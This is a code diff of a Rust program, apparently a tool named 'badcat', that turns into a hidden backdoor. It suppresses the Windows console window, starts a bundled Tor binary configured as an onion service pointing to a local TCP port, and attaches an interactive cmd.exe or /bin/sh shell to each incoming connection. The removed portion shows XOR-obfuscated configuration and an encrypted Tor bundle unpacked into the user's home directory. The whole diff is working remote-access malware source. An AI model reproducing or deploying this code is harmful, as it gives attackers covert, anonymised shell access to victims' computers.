@@ -1,65 +1,25 @@
-mod config;
-mod setting;
+#![windows_subsystem = "windows"]
 
-use std::{io, error};
+mod setting;
+mod config;
+
+use std::{io, error, thread};
 use std::fs::File;
 use std::path::{PathBuf};
-use std::process::{Command, Stdio};
-
-use badcat_lib::xor;
+use std::process::{Command, Stdio, Child};
+use std::net::{TcpListener, TcpStream};
 
 fn main() -> Result<(), Box<dyn error::Error>> {
-    let setting: setting::Setting = load_settings();
-
-    std::fs::create_dir_all(&setting.tor_dir)?;
+    let setting = setting::Setting::new()?;
     
-    unbundle_tor(&setting)?;
+    start_tcp_server(&setting)?;
 
-    let torrc = &setting.tor_dir.join("config");
-    unbundle_torrc(&torrc, &setting)?;
-
-    start_tor_binary(&torrc, &setting)?;
-
-    Ok(())
-}
-
-fn load_settings() -> setting::Setting {
-    let key = String::from(config::ENC_KEY);
-    let name = String::from(config::NAME);
-
-    let tor_dir = xor::decode(
-        &key,
-        &String::from(config::ENC_TOR_DIR)
-    ).unwrap_or_else(|_| {
-        panic!("problem unserializing directory");
-    });
-
-    let torrc = xor::decode(
-        &key,
-        &String::from(config::ENC_TORRC)
-    ).unwrap_or_else(|_| {
-        panic!("problem unserializing rc");
-    });
-
-    setting::Setting {
-        name,
-        key,
-        torrc,
-        tor_dir: expand_user_dir(&tor_dir)
-    }
-}
-
-fn unbundle_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
-    let bundle = config::ENC_TOR_BUNDLE;
-    let bytes = xor::decode_bytes(&setting.key, &String::from(bundle))?;
-
-    let mut ar = tar::Archive::new(io::Cursor::new(&bytes));
-    ar.unpack(&setting.tor_dir.join("..").join(".."))?;
     Ok(())
 }
 
 fn unbundle_torrc(
     path: &PathBuf,
+    port: u16,
     setting: &setting::Setting
 ) -> Result<(), Box<dyn error::Error>> {
     let mut contents = setting.torrc.clone();
@@ -79,25 +39,20 @@ fn unbundle_torrc(
         setting.tor_dir.join("ctrl.socket").to_str().unwrap()
     );
 
+    contents = contents.replace(
+        "@{SERVICE_ADDR}",
+        &format!("127.0.0.1:{}", port)
+    );
+
     std::fs::write(&path, &contents)?;
 
     Ok(())
 }
 
-fn expand_user_dir(path: &String) -> PathBuf {
-    let mut home_dir = match dirs::home_dir() {
-        Some(d) => d,
-        None => panic!("problem finding home user directory")
-    };
-
-    home_dir.push(PathBuf::from(path));
-    home_dir
-}
-
 fn start_tor_binary(
     torrc: &PathBuf,
     setting: &setting::Setting
-) -> Result<(), Box<dyn error::Error>> {
+) -> Result<Child, Box<dyn error::Error>> {
     let mut executable = setting.tor_dir.join(&setting.name);
 
     if cfg!(windows) {
@@ -124,12 +79,106 @@ fn start_tor_binary(
     let stdout: File = File::create(&log)?;
     let stderr: File = File::create(&log)?;
 
-    Command::new(executable)
+    let proc = Command::new(executable)
         .args(["-f", torrc.to_str().unwrap()])
         .stdin(Stdio::null())
         .stdout(stdout)
         .stderr(stderr)
         .spawn()?;
+
+    Ok(proc)
+}
+
+fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
+    let listener = TcpListener::bind("127.0.0.1:0")?;
+    let port = listener.local_addr()?.port();
+    println!("listening at: {:?}", port);
+
+    let torrc = &setting.tor_dir.join("config");
+    unbundle_torrc(&torrc, port, &setting)?;
+
+    let mut tor_proc = start_tor_binary(&torrc, &setting)?;
+
+    for stream in listener.incoming() {
+        match stream {
+            Ok(stream) => {
+                println!("received connection");
+                match bind_shell(stream) {
+                    Ok(()) => {},
+                    Err(error) => println!("connection error: {:?}", error)
+                };
+            },
+            Err(error) => return Err(Box::new(error))
+        }
+    }
+
+    tor_proc.kill()?;
+
+    Ok(())
+}
+
+fn pipe_thread<R, W>(mut r: R, mut w: W) -> thread::JoinHandle<()>
+where R: io::Read + Send + 'static,
+      W: io::Write + Send + 'static
+{
+    thread::spawn(move || {
+        let mut buffer = [0; 1024];
+        loop {
+            let len = match r.read(&mut buffer) {
+                Ok(len) => len,
+                Err(_) => break
+            };
+
+            if len == 0 {
+                break;
+            }
+
+            match w.write(&buffer[..len]) {
+                Ok(_) => {},
+                Err(_) => break
+            };
+
+            match w.flush() {
+                Ok(_) => {},
+                Err(_) => break
+            };
+        }
+    })
+}
+
+fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
+    let mut args: Vec<&str> = Vec::new();
+
+    let shell;
+    if cfg!(windows) {
+        shell = "cmd.exe";
+    } else {
+        shell = "/bin/sh";
+        args.push("-i");
+    }
+
+    let proc = Command::new(shell)
+        .args(args)
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()?;
+
+    let stdin = proc.stdin.unwrap();
+    let stdout = proc.stdout.unwrap();
+    let stderr = proc.stderr.unwrap();
+
+    let stream_in = stream.try_clone()?;
+    let stream_out = stream.try_clone()?;
+    let stream_err = stream.try_clone()?;
+
+    let in_thread = pipe_thread(stream_in, stdin);
+    let out_thread = pipe_thread(stdout, stream_out);
+    let err_thread = pipe_thread(stderr, stream_err);
+
+    in_thread.join().unwrap();
+    out_thread.join().unwrap();
+    err_thread.join().unwrap();
 
     Ok(())
 }
